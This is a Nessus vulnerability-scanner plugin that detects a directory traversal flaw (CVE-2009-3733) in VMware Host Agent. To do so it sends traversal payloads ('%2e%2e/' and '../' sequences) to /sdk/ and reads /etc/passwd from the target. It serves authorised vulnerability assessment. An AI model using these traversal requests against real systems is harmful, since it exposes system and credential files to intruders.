#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(44646);
  script_version("$Revision: 1.16 $");
  script_cvs_date("$Date: 2016/11/15 19:41:08 $");

  script_cve_id("CVE-2009-3733");
  script_bugtraq_id(36842);
  script_osvdb_id(59440);
  script_xref(name:"VMSA", value:"2009-0015");
  script_xref(name:"Secunia", value:"37186");

  script_name(english:"VMware Host Agent Directory Traversal (VMSA-2009-0015)");
  script_summary(english:"Tries to grab /etc/passwd");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A web application on the remote host has a directory traversal
vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of VMware Host Agent (hostd) running on the remote host
has a directory traversal vulnerability.  The affected service runs
as root.  VMware ESX, VMware ESXi, and VMware Server on Linux are
affected.

A remote attacker could exploit this to read arbitrary files,
including guest VMs, from the system."
  );
  # http://www.fyrmassociates.com/pdfs/Stealing_Guests_The_VMware_Way-ShmooCon2010.pdf
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?1ead3846");
  script_set_attribute(
    attribute:"see_also",
    value:"http://fyrmassociates.com/tools/gueststealer-v1.pl"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://seclists.org/bugtraq/2009/Oct/274"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.vmware.com/security/advisories/VMSA-2009-0015.html"
  );
  script_set_attribute(attribute:"solution", value:"Apply the relevant upgrade referenced in the VMware advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Vmware Server File Disclosure");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
 script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');
 script_cwe_id(22);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/10/27");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/10/27");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/02/17");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:a:vmware:esx");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:a:vmware:esxi");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:a:vmware:server");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("vmware_hostd_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/vmware_hostd");

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


os = get_kb_item('Host/OS');
if (os && 'Windows' >< os)
  exit(0, 'This is a Windows host, and only Linux hosts are affected.');

port = get_http_port(default:80);
install = get_install_from_kb(appname:'vmware_hostd', port:port);
if (isnull(install))
  exit(1, "No VMware hostd installs on port "+port+" were found in the KB.");

# dir traversal depends on the product being exploited (ESX/ESXi or Server)
if ('esx' >< tolower(install['ver']))
  dotdot = '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/';
else if ('server' >< tolower(install['ver']))
  dotdot = '../../../../../../../../..';
else
  exit(0, 'VMware Server/ESX/ESXi does not appear to be running on the remote host.');

url = '/sdk/'+dotdot+'/etc/passwd';
req = http_mk_get_req(port:port, item:url);
res = http_send_recv_req(port:port, req:req);
if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

if (ereg(string:res[2], pattern:'root:.*:0:[01]:'))
{
  if (report_verbosity > 0)
  {
    req_str = http_mk_buffer_from_req(req:req);
    report =
      '\nNessus was able to exploit the issue to retrieve the contents of\n'+
      "'/etc/passwd' on the remote host using the following URL :" + '\n\n'+
      crap(data:"-", length:30)+" snip "+crap(data:"-", length:30)+'\n'+
      req_str+
      crap(data:"-", length:30)+" snip "+crap(data:"-", length:30)+'\n';

    if (report_verbosity > 1)
    {
      report +=
        '\nHere are its contents :\n\n'+
        crap(data:"-", length:30)+" snip "+crap(data:"-", length:30)+'\n'+
        res[2]+
        crap(data:"-", length:30)+" snip "+crap(data:"-", length:30)+'\n';
    }
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
else
{
  full_url = build_url(qs:install['dir'], port:port);
  exit(0, 'The VMware hostd install at '+full_url+' is not affected.');
}
